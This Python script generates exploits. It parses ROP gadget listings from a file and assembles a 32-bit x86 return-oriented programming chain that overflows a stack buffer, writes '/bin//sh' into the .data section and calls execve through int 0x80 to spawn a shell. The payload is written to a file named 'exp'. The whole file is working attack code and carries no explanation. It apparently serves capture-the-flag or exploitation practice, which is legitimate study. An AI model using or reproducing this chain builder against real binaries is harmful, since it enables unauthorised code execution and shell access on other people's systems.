import re
from struct import pack

class ParseChain():
    def __init__(self) -> None:
        pass

    def parse_gadget(self, gadget):
        print(gadget)
        regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})) ; ret", gadget)
        if regex:
            self.STACK_REG = gadget.split('[')[1].split(']')[0]
            self.MOVSTACK = pack('<I', int(gadget.split(' ')[0], 16))
            return
        
        regex = re.search('pop eax ; ret', gadget)
        if regex:
            self.POP_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            return
        regex = re.search('pop ecx ; pop ebx ; ret', gadget)
        if regex:
            self.POP_ECX_EBX = pack('<I', int(gadget.split(' ')[0], 16))
            return
        regex = re.search('pop ebx ; ret', gadget)
        if regex:
            self.POP_EBX = pack('<I', int(gadget.split(' ')[0], 16))
            return
        regex = re.search('pop edx ; ret', gadget)
        if regex:
            self.POP_EDX = pack('<I', int(gadget.split(' ')[0], 16))
            return
        
        regex = re.search('xor eax, eax ; ret', gadget)
        if regex:
            self.XOR_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            return
        
        regex = re.search('inc eax ; ret', gadget)
        if regex:
            self.INC_EAX = pack('<I', int(gadget.split(' ')[0], 16))
            return

        regex = re.search('int 0x80', gadget)
        if regex:
            self.INT_80 = pack('<I', int(gadget.split(' ')[0], 16))
            return
        
    def parse_data_loc(self, data_loc):
        self.DATA = int(data_loc, 16)
        
    def make_chain(self):
        p = b'A'*40
        p += b'B'*4

        p += self.POP_EDX
        p += pack('<I', self.DATA)
        p += self.POP_EAX
        p += b'/bin'
        p += self.MOVSTACK

        p += self.POP_EDX
        p += pack('<I', self.DATA + 4)
        p += self.POP_EAX
        p += b'//sh'
        p += self.MOVSTACK

        p += self.POP_EDX
        p += pack('<I', self.DATA + 8)
        p += self.XOR_EAX
        p += self.MOVSTACK

        p += self.POP_EBX
        p += pack('<I', self.DATA)
        p += self.POP_ECX_EBX
        p += pack('<I', self.DATA + 8)
        p += pack('<I', self.DATA)
        p += self.POP_EDX
        p += pack('<I', self.DATA + 8)

        p += self.XOR_EAX
        for _ in range(0, 11): p += self.INC_EAX
        p += self.INT_80

        return p


    def write_chain(self, chain):
        out_file = open('exp', 'wb')
        out_file.write(chain)


    def start(self):
        file = open('out.txt','r')
        lines = file.readlines()
        for line in lines:
            regex = re.search("Gadget found", line)
            if regex: self.parse_gadget(line.split(":")[1][1:])
            regex = re.search("# @ .data\n", line)
            if regex: self.parse_data_loc(line.split(",")[1][1:11])
        
        chain = self.make_chain()
        self.write_chain(chain)

pc = ParseChain()
pc.start()